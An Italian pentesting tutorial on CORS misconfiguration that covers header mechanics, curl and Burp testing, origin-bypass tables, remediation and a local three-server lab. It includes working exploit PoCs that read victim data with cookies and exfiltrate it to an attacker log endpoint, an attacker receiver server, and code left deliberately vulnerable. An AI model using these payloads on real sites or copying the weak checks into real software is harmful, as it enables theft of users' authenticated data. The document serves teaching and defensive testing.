---
title: 'CORS Misconfiguration: Cos''è, Exploit e Bypass per Pentest'
slug: cors-misconfiguration
description: 'Cross-Origin Resource Sharing (CORS): test di misconfiguration con curl e Burp, Origin Reflection, Null Origin, bypass, preflight, payload, PoC e remediation.'
image: /cors-cross-origin-resource-sharing-pentesting.webp
draft: false
date: 2026-03-14T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - CORS
  - Cross-Origin Resource Sharing
  - CORS Misconfiguration
  - CORS Exploitation
  - Access-Control-Allow-Origin
---

# CORS (Cross-Origin Resource Sharing): Exploit, Bypass e Pentest

**CORS** è la sigla di `Cross-Origin Resource Sharing`. Il significato è: condivisione di risorse tra origini diverse. È il meccanismo HTTP con cui un server autorizza specifiche origini a **leggere** le sue risposte nelle richieste cross-origin, usando header dedicati. Per default il browser lo vieta: se sei su `evil.com`, il tuo JavaScript non può leggere la risposta di `target.com`. Gli header CORS aprono eccezioni a questa regola.

Una **CORS misconfiguration** nasce quando il server apre troppo: accetta qualsiasi `Origin`, lo riflette senza controllarlo, si fida di `null` o usa una regex sbagliata. Il risultato è che il JavaScript di un sito dell'attaccante può leggere dati autenticati della vittima, se si verificano anche le altre condizioni che vediamo sotto.

Questa guida copre la **CORS vulnerability** dal lato pentest (detection, bypass, exploit, PoC) e dal lato sviluppatore (l'errore `No 'Access-Control-Allow-Origin' header is present`, come si corregge). Tutto è provato in un laboratorio locale: [vai al laboratorio](#laboratorio-cors-prova-tutto-in-locale) in fondo alla guida.

Per il quadro generale sulle API vedi la [guida API & Modern Web Attacks](https://hackita.it/articoli/api-modern-web-attacks-guida-completa/). CORS si capisce meglio con la [Same-Origin Policy](https://hackita.it/articoli/same-origin-policy/) e si confonde spesso con [CSRF](https://hackita.it/articoli/csrf/): le differenze sono nella sezione dedicata.

Riferimenti ufficiali: [PortSwigger](https://portswigger.net/web-security/cors) e [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS).

## Come funziona CORS (`Cross-Origin Resource Sharing`)

Una pagina su `evil.com` esegue questo codice:

```javascript
// JavaScript running on evil.com
fetch("https://target.com/api/me", { credentials: "include" })
```

Cosa succede:

* Il browser manda la richiesta a `target.com` e aggiunge `Origin: https://evil.com`.
* Il server risponde. Se vuole permettere la lettura, aggiunge `Access-Control-Allow-Origin: https://evil.com`.
* Per includere i cookie serve anche `Access-Control-Allow-Credentials: true`.
* Il browser controlla gli header. Se mancano o non corrispondono, **blocca la lettura** della risposta al JavaScript.

Due punti importanti:

* La richiesta **arriva comunque al server**. CORS non impedisce l'invio, impedisce la lettura. Per questo non sostituisce la protezione [CSRF](https://hackita.it/articoli/csrf/).
* CORS **non è un sistema di autenticazione**. Decide chi può leggere la risposta, non chi ha il diritto di chiederla.

## Errore CORS: "No 'Access-Control-Allow-Origin' header is present"

Se sei qui da Google per questo errore, eccolo:

```text
Access to fetch at 'http://127.0.0.1:8040/api/me/none' from origin 'http://127.0.0.1:8041' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.
```

Il significato è semplice: il server ha risposto, ma **senza** l'header `Access-Control-Allow-Origin`. Il browser quindi non lascia leggere la risposta alla tua pagina. Cose da sapere:

* **Il problema è nel server**, non nel codice frontend. Si risolve aggiungendo gli header giusti sulla risposta dell'API.
* Con una richiesta preflight (`OPTIONS`) l'errore può dipendere dalla risposta `OPTIONS`: anche quella deve avere gli header CORS.
* `mode: "no-cors"` nel `fetch` **non risolve**: la richiesta parte, ma la risposta resta opaca e non la puoi leggere.
* Con `credentials: "include"` il valore `*` non basta: serve un'origine esplicita e `Access-Control-Allow-Credentials: true`.

Esempio di correzione sicura con Express e il pacchetto `cors`:

```javascript
// Allow only the real frontend origin, with cookies
const cors = require("cors");
app.use(cors({
  origin: ["https://app.example.com"],
  credentials: true,
}));
```

La soluzione sbagliata che si trova online è "metti `*` o rifletti l'`Origin`": è esattamente la misconfiguration di cui parla il resto della guida.

## CORS misconfiguration: quando diventa una vulnerabilità

Non ogni header CORS permissivo è un problema. Dipende da **cosa** si può leggere e **con quali credenziali**:

| Configurazione                                               | Possibile impatto                                                    |
| ------------------------------------------------------------ | -------------------------------------------------------------------- |
| Origin Reflection + `Access-Control-Allow-Credentials: true` | Lettura di dati autenticati, se le altre condizioni sono soddisfatte |
| `null` accettato                                             | Accesso da contesti con origine `null` (iframe sandbox, file locali) |
| Controllo con `startsWith`, `contains` o regex permissiva    | Accesso da origini controllate dall'attaccante                       |
| Sottodomini fidati + XSS su un sottodominio                  | Abuso della relazione di fiducia tra sottodomini                     |
| `*` senza credenziali                                        | Lettura di risorse pubbliche: non è data theft                       |
| `*` con credenziali                                          | Il browser rifiuta la risposta: non sfruttabile così                 |
| Origin `http://` fidata da un'API HTTPS                      | Un attaccante in rete può compromettere la fiducia                   |

Condizioni perché il furto dati funzioni nel browser:

* l'API risponde con dati sensibili usando i **cookie** (o altra credenziale che il browser invia da solo)
* il server manda `Access-Control-Allow-Origin` con l'origine dell'attaccante e `Access-Control-Allow-Credentials: true`
* il cookie viene davvero inviato: contano `SameSite` e le policy sui cookie di terze parti. Un cookie `SameSite=Lax` non parte da una richiesta cross-site
* la vittima è autenticata e visita la pagina dell'attaccante

Una API che usa solo `Authorization: Bearer` (per esempio un [JWT](https://hackita.it/articoli/jwt/)) in un header scritto a mano dal client non è sfruttabile così: l'attaccante non ha il token da mettere nell'header.

## CORS Testing con curl e Burp Suite

Con `curl` usa una GET vera e mostra gli header. `curl -I` fa una richiesta `HEAD`, che può rispondere diversamente dal `GET` del browser:

```bash
# Test 1: does the server reflect an arbitrary Origin?
curl -s -D - -o /dev/null "http://127.0.0.1:8040/api/me/reflect" \
  -H "Origin: https://evil.example" \
  -H "Cookie: session=user-session-1234"
```

Cerchi due righe nella risposta:

```text
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true
```

Se l'origine inventata torna uguale e c'è `Access-Control-Allow-Credentials: true`, l'API riflette qualsiasi `Origin`. Controlla anche `Origin: null` e le varianti dei bypass della sezione dopo.

Workflow con [Burp Suite](https://hackita.it/articoli/burp-suite/):

* **Proxy / HTTP history**: individua gli endpoint che restituiscono dati dell'utente (`/api/me`, `/profile`, `/account`).
* **Repeater**: aggiungi o modifica l'header `Origin` e guarda `Access-Control-Allow-Origin` e `Access-Control-Allow-Credentials` nella risposta.
* **Sessione autenticata**: ripeti con il cookie valido, perché un endpoint senza sessione di solito non restituisce niente di interessante.
* **Conferma nel browser**: Burp ti dice cosa risponde il server, non cosa il browser lascia leggere. Verifica sempre con un PoC (sezione dopo).

## CORS Preflight: richiesta OPTIONS e header HTTP

Non ogni richiesta cross-origin è uguale:

* **Simple request**: `GET`, `HEAD` o `POST` con header e `Content-Type` "semplici" (per esempio `text/plain`). Parte subito.
* **Richiesta con preflight**: metodo come `PUT` o `DELETE`, header personalizzati (`X-Api-Token`) o `Content-Type: application/json`. Il browser prima manda un `OPTIONS` e aspetta il permesso.

Il preflight contiene `Access-Control-Request-Method` e `Access-Control-Request-Headers`. Il server risponde con `Access-Control-Allow-Methods` e `Access-Control-Allow-Headers`. Puoi simularlo:

```bash
# Simulate the browser preflight
curl -i -X OPTIONS "http://127.0.0.1:8040/api/transfer/reflect" \
  -H "Origin: https://evil.example" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: x-api-token"
```

Tutti gli header CORS in una tabella:

| Header                             | Chi lo manda        | A cosa serve                                                               |
| ---------------------------------- | ------------------- | -------------------------------------------------------------------------- |
| `Origin`                           | Browser             | Origine della pagina che fa la richiesta                                   |
| `Access-Control-Allow-Origin`      | Server              | Origine autorizzata a leggere la risposta (o `*`)                          |
| `Access-Control-Allow-Credentials` | Server              | Permette di leggere risposte ottenute con cookie                           |
| `Access-Control-Request-Method`    | Browser (preflight) | Metodo che la richiesta vera userà                                         |
| `Access-Control-Request-Headers`   | Browser (preflight) | Header personalizzati che la richiesta vera userà                          |
| `Access-Control-Allow-Methods`     | Server              | Metodi permessi nel preflight                                              |
| `Access-Control-Allow-Headers`     | Server              | Header permessi nel preflight                                              |
| `Access-Control-Max-Age`           | Server              | Per quanto tempo il browser può riusare l'esito del preflight (in secondi) |
| `Access-Control-Expose-Headers`    | Server              | Header della risposta che JavaScript può leggere oltre a quelli di base    |
| `Vary: Origin`                     | Server              | Dice alle cache che la risposta cambia in base all'`Origin`                |

Se il preflight viene rifiutato, il browser **non manda** la richiesta vera: nel laboratorio (test 8) il server vede solo l'`OPTIONS` e mai il `PUT`.

## CORS Bypass: errori nella validazione dell'Origin

Quando il server confronta l'`Origin` con una lista o una regex, gli errori sono quasi sempre di questi tipi. Nel laboratorio ogni errore ha un endpoint: `prefix`, `contains`, `suffix`, `dot` e `http`, tutti con trusted domain `app.example.test`.

| Controllo sbagliato          | Esempio nel codice                              | Origin che passa                    |
| ---------------------------- | ----------------------------------------------- | ----------------------------------- |
| `startsWith`                 | `origin.startswith("https://app.example.test")` | `https://app.example.test.evil.com` |
| `contains`                   | `"app.example.test" in origin`                  | `https://evil-app.example.test`     |
| `endsWith` senza il punto    | `origin.endswith("app.example.test")`           | `https://evilapp.example.test`      |
| Regex con punti non escapati | `^https://app.example.test$`                    | `https://appXexample.test`          |
| Protocollo non controllato   | accetta anche `http://`                         | `http://app.example.test`           |

Il test con `curl` su tutti gli endpoint (output reale del laboratorio, `OK` significa che l'`Origin` viene riflessa in `Access-Control-Allow-Origin` con le credenziali):

| Origin inviata                      | prefix | contains | suffix | dot | http |
| ----------------------------------- | ------ | -------- | ------ | --- | ---- |
| `https://app.example.test.evil.com` | OK     | OK       | no     | no  | no   |
| `https://evil-app.example.test`     | no     | OK       | OK     | no  | no   |
| `https://evilapp.example.test`      | no     | OK       | OK     | no  | no   |
| `https://appXexample.test`          | no     | no       | no     | OK  | no   |
| `http://app.example.test`           | no     | OK       | OK     | no  | OK   |
| `https://evil.example`              | no     | no       | no     | no  | no   |

Per sfruttare questi casi nel browser l'attaccante deve controllare quel dominio (`app.example.test.evil.com`, `evil-app.example.test`...), cioè registrarlo. Nel lab locale non è possibile, quindi si verificano con `curl`. Il caso `http://` serve in più un attaccante in rete (man-in-the-middle) che manipola la pagina HTTP fidata: vedi [man-in-the-middle](https://hackita.it/articoli/man-in-the-middle/).

Altri punti da provare, sempre dipendenti dal server:

* **Porta diversa**: se il controllo guarda solo l'hostname, `https://app.example.test:8443` passa.
* **Caratteri insoliti nell'hostname** (per esempio underscore o backtick): alcune validazioni e alcuni browser li trattano in modo diverso. Dipende da browser e server, da testare caso per caso. Non l'ho provato nel laboratorio.
* **Sottodomini**: se `*.target.com` è fidato, vale la sezione sulla XSS su sottodominio.

## CORS Exploit Payload e PoC: tutte le varianti

Tutte le varianti, con il PoC. Requisiti comuni: l'attaccante manda `Origin: https://evil.example` e la risposta deve avere `Access-Control-Allow-Credentials: true` più `Access-Control-Allow-Origin` uguale a quell'origine (oppure `null`). L'unica variante senza credenziali è il wildcard.

### 1. Origin Reflection (XMLHttpRequest)

```html
<script>
// Read the API with the victim cookie, then send the response to the attacker
var req = new XMLHttpRequest();
req.onload = function () {
  location = "http://127.0.0.1:8041/log?d=" + encodeURIComponent(this.responseText);
};
req.open("get", "http://127.0.0.1:8040/api/me/reflect", true);
req.withCredentials = true;
req.send();
</script>
```

La versione con `fetch` è nella sezione sull'exploitation. Entrambe sono nel laboratorio (test 2 e 3).

### 2. Null Origin

Iframe sandbox con `srcdoc`, descritto nella sezione sul Null Origin (test 7 del laboratorio).

### 3. XSS su un'origine fidata

Se il server ha una allowlist stretta ma una delle origini fidate ha una [XSS](https://hackita.it/articoli/xss/), il payload gira **dentro** quell'origine e il controllo CORS passa. Nel laboratorio l'API `/api/me/safe` si fida solo di `http://127.0.0.1:8042`, che ha una ricerca vulnerabile. La pagina dell'attaccante manda la vittima lì:

```html
<script>
// The API trusts only 127.0.0.1:8042: run the attack from inside that origin through its XSS
var attack = '<script>fetch("http://127.0.0.1:8040/api/me/safe", {credentials: "include"})' +
  '.then((r) => r.json())' +
  '.then((d) => { new Image().src = "http://127.0.0.1:8041/log?d=" + encodeURIComponent(JSON.stringify(d)); });<\/script>';
location = "http://127.0.0.1:8042/search?q=" + encodeURIComponent(attack);
</script>
```

Una allowlist corretta non basta se un'origine fidata è vulnerabile (test 10).

### 4. Wildcard senza credenziali: la rete interna

`Access-Control-Allow-Origin: *` non porta cookie, quindi non ruba sessioni. Diventa interessante su servizi che **non richiedono autenticazione** ma sono raggiungibili solo dal browser della vittima (intranet, `localhost`, API interne). Il browser della vittima fa da ponte:

```javascript
// No credentials: works only against endpoints that need no authentication
var req = new XMLHttpRequest();
req.onload = function () {
  location = "http://127.0.0.1:8041/log?d=" + encodeURIComponent(this.responseText);
};
req.open("get", "http://127.0.0.1:8040/api/me/public", true);
req.send();
```

È l'idea dietro lo strumento open source of-cors e dietro il PoC HackITA [XSS Internal Exfiltration](https://github.com/hack-ita/xss-internal-exfil-poc). Concettualmente è vicino a una [SSRF](https://hackita.it/articoli/ssrf/), ma la richiesta parte dal browser della vittima e non dal server.

### 5. Origin expansion (regex e controlli deboli)

Sono i casi della tabella sopra: prefisso, contains, suffix, punto non escapato, `http://`.

### 6. Preflight permissivo

Se il server riflette anche i metodi e gli header richiesti nel preflight, qualsiasi `PUT`, `DELETE` o header personalizzato viene permesso dall'origine dell'attaccante. Vedi la sezione sul preflight e il test 8.

### 7. Cache e `Vary: Origin`

Se `Access-Control-Allow-Origin` cambia in base all'`Origin` ma la risposta non ha `Vary: Origin`, una cache (CDN, proxy, cache del browser) può servire a un'origine la risposta pensata per un'altra. Effetti: errori CORS per gli utenti legittimi o risposte con l'origine sbagliata. È una verifica da fare sempre sulle API dietro CDN. Non l'ho provato nel laboratorio.

## CORS Scanner e tool per il pentesting

| Tool                                                                                          | A cosa serve                                                    |
| --------------------------------------------------------------------------------------------- | --------------------------------------------------------------- |
| [Burp Suite](https://hackita.it/articoli/burp-suite/)                                         | Test manuale con Repeater modificando l'`Origin`                |
| Corsy                                                                                         | Scanner CORS per URL singoli o liste                            |
| CORScanner                                                                                    | Scanner veloce di misconfiguration CORS                         |
| CorsOne                                                                                       | Scoperta rapida di CORS misconfiguration                        |
| of-cors                                                                                       | Sfruttare CORS su reti interne tramite il browser della vittima |
| [XSS Internal Exfiltration PoC](https://github.com/hack-ita/xss-internal-exfil-poc) (HackITA) | Leggere URL interni dal browser della vittima e riceverli       |
| `curl`                                                                                        | Il primo test: invii `Origin` e guardi gli header               |

### CORS Scanner: Corsy e CORScanner

Con Corsy (richiede solo Python 3 e la libreria `requests`) scansioni un URL, una lista o l'output di un altro tool:

```bash
# Scan one URL with Corsy
python3 corsy.py -u http://127.0.0.1:8040/api/me/reflect
```

Output reale sull'endpoint vulnerabile del laboratorio:

```text
 + http://127.0.0.1:8040/api/me/reflect
   - Class: origin reflected
   - Description: This host allows any origin to make requests to it.
   - Severity: high
   - Exploitation: Make requests from any domain you control.
   - ACAO Header: http://example.com
   - ACAC Header: true
```

Sull'endpoint sicuro `/api/me/safe` risponde `No misconfigurations found.` Altre opzioni utili: `-i urls.txt` per una lista, `-t` per i thread, `-o risultati.json` per salvare l'output, `--headers` per aggiungere cookie o altri header di sessione.

CORScanner si usa in modo simile (`python cors_scan.py -u example.com`, oppure `-i` con una lista di domini). Non l'ho eseguito nel laboratorio.

Differenza tra rilevamento automatico e conferma manuale: lo scanner controlla gli header con `Origin` di prova, ma non sa quanto valgono i dati dell'endpoint e non verifica come il browser invia il cookie. Il risultato di Corsy o CORScanner è un indizio. Conferma sempre con un PoC nel browser e una sessione valida.

## Exploitation: PoC JavaScript

Se il server riflette l'`Origin` con le credenziali, il PoC è questo. Lo ospita il sito dell'attaccante, la vittima autenticata lo visita:

```html
<script>
// Read the API from the attacker origin, sending the victim cookie
fetch("http://127.0.0.1:8040/api/me/reflect", { credentials: "include" })
  .then((r) => r.json())
  .then((data) => {
    // Send what was read to the attacker server
    new Image().src = "http://127.0.0.1:8041/log?d=" + encodeURIComponent(JSON.stringify(data));
  });
</script>
```

Nel laboratorio (test 2) il server dell'attaccante riceve:

```text
STOLEN: {"user":"marco","email":"marco@example.test","api_key":"demo-key-0001"}
```

La vittima non vede niente: nessun popup, nessun redirect. Nota che il cookie di sessione è `HttpOnly` e il furto funziona lo stesso: CORS usa il cookie **dentro il browser**, non lo legge.

## Null Origin: quando funziona e quando no

Un server che accetta `Origin: null` si può raggiungere da un iframe con `sandbox`, che gira con origine `null`:

```html
<iframe sandbox="allow-scripts" srcdoc="<script>
fetch('http://127.0.0.1:8040/api/me/null', {credentials: 'include'})
  .then((r) => r.json())
  .then((d) => { new Image().src = 'http://127.0.0.1:8041/log?d=' + encodeURIComponent(JSON.stringify(d)); });
</script>"></iframe>
```

Ma `null` accettato **non basta**. Nel laboratorio (test 7) con un cookie normale (`SameSite=Lax` di default) il server riceve la richiesta senza cookie e risponde `{"error":"not logged in"}`. Solo con un cookie `SameSite=None; Secure` il furto riesce. Quindi per documentare un Null Origin nel report devi verificare anche come viene inviato il cookie di sessione.

## Subdomain XSS + CORS

Se l'API si fida di tutti i sottodomini del tuo target (con una logica applicativa: `*.target.com` non è un valore valido dentro `Access-Control-Allow-Origin`), una [XSS](https://hackita.it/articoli/xss/) su un qualsiasi sottodominio, anche senza dati sensibili, diventa una chiave per leggere l'API:

* `blog.target.com` ha una XSS stored.
* `api.target.com` si fida di `*.target.com` e risponde con credenziali.
* Lo script iniettato su `blog.target.com` legge `api.target.com` con i cookie della vittima.

Per questo la fiducia "tutti i sottodomini" è rischiosa. Se non vedi l'esecuzione subito, guarda anche la [Blind XSS](https://hackita.it/articoli/blind-xss/) e la [Stored XSS](https://hackita.it/articoli/xss-stored/).

## Impatto: cosa si legge davvero

L'impatto si misura sui dati restituiti dall'endpoint, non sul fatto che l'header sia sbagliato. Se la risposta contiene token o identificatori di sessione si passa al [session hijacking](https://hackita.it/articoli/session-hijacking/). Nel laboratorio l'endpoint restituisce questi dati simulati:

```text
{"user":"marco","email":"marco@example.test","api_key":"demo-key-0001"}
```

Sono dati inventati del laboratorio. In un assessment vero si documenta cosa contiene la risposta: dati personali, token, chiavi, dati finanziari.

Attenzione alle catene teoriche: una `api_key` nella risposta può dare accesso ad altri sistemi, ma **dipende dai privilegi della chiave e dai controlli applicativi**. La sola CORS misconfiguration non garantisce un accesso finanziario o cloud. Nel report separa ciò che hai dimostrato da ciò che è solo possibile.

## CORS vs Same-Origin Policy vs CSRF

|                                   | Same-Origin Policy                                  | CORS                                         | CSRF                                                           |
| --------------------------------- | --------------------------------------------------- | -------------------------------------------- | -------------------------------------------------------------- |
| Cos'è                             | Regola del browser                                  | Meccanismo che rilassa la SOP                | Attacco che usa il browser della vittima                       |
| Cosa controlla                    | Chi può **leggere** le risposte di un'altra origine | Quali origini il server autorizza a leggerle | Richieste che cambiano stato, fatte con i cookie della vittima |
| Impedisce l'invio della richiesta | No                                                  | No                                           | No                                                             |
| Cosa serve per difendersi         | Niente, è automatica                                | Allowlist esplicita                          | Token anti-CSRF, `SameSite`, controllo dell'`Origin`           |

Una richiesta può arrivare al server anche quando il JavaScript non può leggerne la risposta: per questo una CORS corretta non sostituisce la difesa CSRF. Approfondimenti: [Same-Origin Policy](https://hackita.it/articoli/same-origin-policy/) e [CSRF](https://hackita.it/articoli/csrf/).

## CORS Misconfiguration: fix, remediation e best practice

Il codice vulnerabile riflette l'origine. Quello sicuro la confronta con una lista esatta:

```python
# Vulnerable: reflects any Origin and allows credentials
def cors_reflect(origin):
    return {"Access-Control-Allow-Origin": origin, "Access-Control-Allow-Credentials": "true"}


# Safe: exact allowlist plus Vary: Origin
TRUSTED = "https://app.example.test"

def cors_safe(origin):
    headers = {"Vary": "Origin"}
    if origin == TRUSTED:
        headers.update({"Access-Control-Allow-Origin": origin, "Access-Control-Allow-Credentials": "true"})
    return headers
```

Regole da applicare:

* **Allowlist esatta** di origini fidate: confronto di protocollo, hostname e porta, mai `startsWith`, `contains` o regex permissive.
* **Mai riflettere** l'header `Origin` senza controllo.
* **Mai `null`** nella allowlist.
* `Access-Control-Allow-Credentials: true` **solo se serve**.
* **`Vary: Origin`** quando `Access-Control-Allow-Origin` cambia in base all'`Origin`, per non far servire a una cache la risposta sbagliata.
* **Limita metodi e header** nelle risposte preflight (`Access-Control-Allow-Methods`, `Access-Control-Allow-Headers`).
* **Non esporre dati inutili** nelle API: meno dati sensibili nella risposta, meno impatto.
* **Cookie con `SameSite=Lax` o `Strict`** dove possibile.
* **Autenticazione, autorizzazione e protezione CSRF** restano comunque lato server.
* **Test automatici** che inviano `Origin` non fidate e verificano che non tornino riflesse.
* **Una [Content Security Policy](https://hackita.it/articoli/xss-csp-bypass/) con `connect-src` stretto** sulle pagine sensibili limita dove uno script può mandare i dati.

## Workflow operativo di penetration testing CORS

* Elenca gli endpoint che restituiscono dati dell'utente autenticato.
* Per ognuno, invia `Origin: https://evil.example` e guarda `Access-Control-Allow-Origin` e `Access-Control-Allow-Credentials`.
* Se non riflette, prova `null` e le varianti di bypass.
* Se un endpoint risponde, controlla come viene mandato il cookie di sessione (`SameSite`).
* Costruisci un PoC HTML e **verificalo nel browser** con una sessione valida.
* Documenta quali dati si leggono, quali condizioni servono e la remediation.

## Checklist CORS

```text
DETECTION
[ ] Origin arbitraria riflessa in Access-Control-Allow-Origin?
[ ] Access-Control-Allow-Credentials: true presente?
[ ] Origin: null accettata?
[ ] Preflight OPTIONS: metodi e header consentiti?

BYPASS
[ ] startsWith / contains / endsWith / regex con punto libero?
[ ] Protocollo http invece di https accettato?
[ ] Porta diversa accettata?
[ ] Tutti i sottodomini fidati? Esiste una XSS su uno di essi?

POC
[ ] Cookie di sessione realmente inviato dal browser (SameSite)?
[ ] Dati autenticati letti dal browser, non solo visti in Burp?

IMPATTO E REMEDIATION
[ ] Quali dati contiene la risposta?
[ ] Allowlist esatta, Vary: Origin, nessun null, credenziali solo se necessario
```

## Domande frequenti sulla CORS misconfiguration

**Cos'è una CORS misconfiguration?**
È una configurazione degli header CORS troppo permissiva: il server accetta, riflette o si fida di origini che non dovrebbe, e un sito esterno può leggere risposte che dovrebbero restare private.

**Come si testa una CORS misconfiguration?**
Invii richieste con un header `Origin` inventato (anche `null`) a un endpoint autenticato e controlli `Access-Control-Allow-Origin` e `Access-Control-Allow-Credentials` nella risposta. Poi confermi con un PoC nel browser.

**`Access-Control-Allow-Origin: *` è pericoloso?**
Di per sé no: senza credenziali espone solo risorse pubbliche. Con `credentials: include` il browser rifiuta la combinazione `*` più cookie, quindi non è un furto dati automatico. Diventa un problema se l'endpoint restituisce dati sensibili senza autenticazione.

**Come si sfrutta una CORS vulnerability?**
Serve un endpoint che riflette o accetta l'origine dell'attaccante con `Access-Control-Allow-Credentials: true`, una vittima autenticata e un cookie che il browser invia davvero. Il PoC è un `fetch` con `credentials: "include"` ospitato su una pagina dell'attaccante.

**Cos'è una null origin CORS vulnerability?**
Il server accetta `Origin: null`, che arriva da iframe sandbox. È sfruttabile solo se il cookie di sessione viene inviato in quel contesto, quindi dipende da `SameSite`.

**Come si risolve una CORS misconfiguration?**
Con una allowlist esatta di origini, senza riflettere l'`Origin`, senza `null`, con `Vary: Origin` e credenziali solo quando servono.

**Come si risolve l'errore "No 'Access-Control-Allow-Origin' header is present"?**
Aggiungendo l'header `Access-Control-Allow-Origin` con l'origine del tuo frontend nella risposta dell'API (e nella risposta `OPTIONS` se c'è il preflight). Non si risolve dal frontend e `no-cors` non lo risolve.

**Che differenza c'è tra CORS e Cross-Origin Resource Sharing?**
Nessuna: CORS è la sigla e `Cross-Origin Resource Sharing` è il nome esteso. Il significato è lo stesso: condivisione di risorse tra origini diverse.

**Quali tool trovano una CORS misconfiguration?**
Corsy e CORScanner per scansioni automatiche, Burp Suite e `curl` per il test manuale. Lo scanner dà un indizio, la conferma si fa con un PoC nel browser.

**Come si testa una CORS vulnerability con Burp Suite?**
Intercetti una richiesta a un endpoint che restituisce dati dell'utente, la mandi in Repeater e cambi l'header `Origin`. Guardi `Access-Control-Allow-Origin` e `Access-Control-Allow-Credentials` nella risposta, poi verifichi nel browser con una sessione autenticata.

## Laboratorio CORS: prova tutto in locale

Tre server su `127.0.0.1`: un'API con una modalità CORS per ogni endpoint (porta 8040), il sito dell'attaccante con il ricevitore (porta 8041) e un'app fidata con una XSS (porta 8042). Gli endpoint `/api/me/{modalità}` restituiscono dati simulati, solo se il cookie `session` è presente.

```bash
# Create the lab folders
mkdir -p cors-lab/api cors-lab/attacker/pages cors-lab/trusted
```

```bash
# API: one endpoint mode per CORS configuration
cat > cors-lab/api/cors_api.py <<'EOF'
import json
import re
from http.server import BaseHTTPRequestHandler, HTTPServer

USER = {"user": "marco", "email": "marco@example.test", "api_key": "demo-key-0001"}
TRUSTED = "http://127.0.0.1:8042"  # the only origin the safe endpoint trusts


# Weak Origin checks, one per endpoint mode (trusted domain: app.example.test)
WEAK_CHECKS = {
    "prefix": lambda o: o.startswith("https://app.example.test"),
    "contains": lambda o: "app.example.test" in o,
    "suffix": lambda o: o.endswith("app.example.test"),
    "dot": lambda o: re.match(r"^https://app.example.test$", o) is not None,  # unescaped dots
    "http": lambda o: o in ("https://app.example.test", "http://app.example.test"),
}


def cors_headers(mode, origin):
    """Return the CORS headers each endpoint mode sends for a given Origin."""
    if mode == "reflect":  # vulnerable: reflects any Origin
        return {"Access-Control-Allow-Origin": origin, "Access-Control-Allow-Credentials": "true"} if origin else {}
    if mode == "null":  # vulnerable: trusts the null origin
        return {"Access-Control-Allow-Origin": "null", "Access-Control-Allow-Credentials": "true"} if origin == "null" else {}
    if mode in WEAK_CHECKS:  # vulnerable: weak validation of the Origin string
        if WEAK_CHECKS[mode](origin):
            return {"Access-Control-Allow-Origin": origin, "Access-Control-Allow-Credentials": "true"}
        return {}
    if mode == "wildcard":  # invalid combination: browsers refuse it
        return {"Access-Control-Allow-Origin": "*", "Access-Control-Allow-Credentials": "true"}
    if mode == "public":  # wildcard without credentials: public data only
        return {"Access-Control-Allow-Origin": "*"}
    if mode == "safe":  # exact allowlist plus Vary: Origin
        headers = {"Vary": "Origin"}
        if origin == TRUSTED:
            headers.update({"Access-Control-Allow-Origin": origin, "Access-Control-Allow-Credentials": "true"})
        return headers
    return {}  # mode "none": no CORS headers at all


class Api(BaseHTTPRequestHandler):
    def reply(self, status, body, extra=None, cookies=()):
        data = json.dumps(body).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        for name, value in (extra or {}).items():
            self.send_header(name, value)
        for cookie in cookies:
            self.send_header("Set-Cookie", cookie)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        parts = self.path.split("?")[0].strip("/").split("/")
        if parts == ["login"]:
            self.reply(200, {"login": "ok"}, cookies=["session=user-session-1234; HttpOnly; Path=/"])
        elif parts == ["login-none"]:
            self.reply(200, {"login": "ok (SameSite=None)"}, cookies=["session=user-session-1234; HttpOnly; Path=/; SameSite=None; Secure"])
        elif parts[:2] == ["api", "me"] and len(parts) == 3:
            headers = cors_headers(parts[2], self.headers.get("Origin", ""))
            if "session=user-session-1234" in self.headers.get("Cookie", ""):
                self.reply(200, USER, headers)
            else:
                self.reply(401, {"error": "not logged in"}, headers)
        else:
            self.reply(404, {"error": "not found"})

    def do_OPTIONS(self):
        mode = self.path.strip("/").split("/")[-1]
        headers = cors_headers(mode, self.headers.get("Origin", ""))
        if headers:
            headers["Access-Control-Allow-Methods"] = "GET, PUT"
            headers["Access-Control-Allow-Headers"] = self.headers.get("Access-Control-Request-Headers", "")
        print("PREFLIGHT /%s Origin=%s Method=%s Headers=%s" % (mode, self.headers.get("Origin"), self.headers.get("Access-Control-Request-Method"), self.headers.get("Access-Control-Request-Headers")), flush=True)
        self.send_response(204)
        for name, value in headers.items():
            self.send_header(name, value)
        self.end_headers()

    def do_PUT(self):
        mode = self.path.strip("/").split("/")[-1]
        print("PUT /%s executed" % mode, flush=True)
        self.reply(200, {"updated": True}, cors_headers(mode, self.headers.get("Origin", "")))

    def log_message(self, *args):
        pass


HTTPServer(("127.0.0.1", 8040), Api).serve_forever()
EOF
```

```bash
# Attacker site: serves the PoC pages and logs what the PoC sends to /log
cat > cors-lab/attacker/cors_attacker.py <<'EOF'
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

PAGES = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pages")


class Attacker(BaseHTTPRequestHandler):
    def do_GET(self):
        url = urlparse(self.path)
        if url.path == "/log":
            print("STOLEN:", parse_qs(url.query).get("d", [""])[0], flush=True)
            self.send_response(204)
            self.end_headers()
            return
        name = os.path.basename(url.path) or "index.html"
        try:
            data = open(os.path.join(PAGES, name), "rb").read()
        except OSError:
            self.send_error(404)
            return
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, *args):
        pass


HTTPServer(("127.0.0.1", 8041), Attacker).serve_forever()
EOF
```

```bash
# Trusted app: the only origin the safe endpoint trusts, with a search page vulnerable to XSS
cat > cors-lab/trusted/trusted_app.py <<'EOF'
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse


class TrustedApp(BaseHTTPRequestHandler):
    def do_GET(self):
        query = parse_qs(urlparse(self.path).query).get("q", [""])[0]
        # Vulnerable on purpose: the search term is reflected without escaping
        body = ("<h1>Results for " + query + "</h1>").encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


HTTPServer(("127.0.0.1", 8042), TrustedApp).serve_forever()
EOF
